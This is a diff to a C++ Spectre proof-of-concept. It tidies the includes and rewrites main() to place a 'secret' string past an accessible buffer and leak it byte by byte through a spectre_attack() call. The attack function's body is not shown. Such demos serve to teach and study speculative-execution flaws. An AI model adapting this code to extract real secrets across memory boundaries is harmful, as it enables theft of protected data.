@@ -1,10 +1,11 @@
+#include <array>
 #include <chrono>
 #include <cstring>
-#include <iostream>
-#include <x86intrin.h>
 #include <exception>
-#include <array>
+#include <iostream>
 #include <memory>
+#include <vector>
+#include <x86intrin.h>
 
 using std::chrono::duration_cast;
 using std::chrono::nanoseconds;
@@ -103,16 +104,27 @@ char spectre_attack(const char* data, std::size_t size, std::size_t evil_index)
 }
 
 auto main() -> int {
-    constexpr const size_t size = 4096;
-    char* const data = new char[2*size];
-    strcpy(data, "Innocuous data");
-    strcpy(data + size, "Top-secret information");
-    for (size_t i = 0; i < size; ++i) {
-        const char c = spectre_attack(data, strlen(data) + 1, size + i);
+    // Size of data array.
+    constexpr const std::size_t memory_block_size = 4096;
+    // Allocate array of double size to pretend like second part is not accessible.
+    std::vector<char> data(2 * memory_block_size );
+
+    // Fill first part of array with data that should be accessible for application.
+    std::string_view accessible_data = "Innocuous data";
+    auto accessible_memory_block_begin = data.begin();
+    std::ranges::copy( accessible_data, accessible_memory_block_begin);
+
+    // Second part of array contains secret and should not be accessible from application.
+    std::string_view secret_data = "Top-secret information";
+    auto secret_memory_block_begin = data.begin() + memory_block_size;
+    std::ranges::copy(secret_data, secret_memory_block_begin);
+
+    // Looping for each byte in "accessible" memory block
+    for (size_t byte_index = 0; byte_index < memory_block_size; ++byte_index) {
+        const char c = spectre_attack(data.data(), strlen(data.data()) + 1, memory_block_size + byte_index);
         std::cout << c << std::flush;
         if(!c) break;
     }
     std::cout << std::endl;
-    delete [] data;
     return 0;
 }
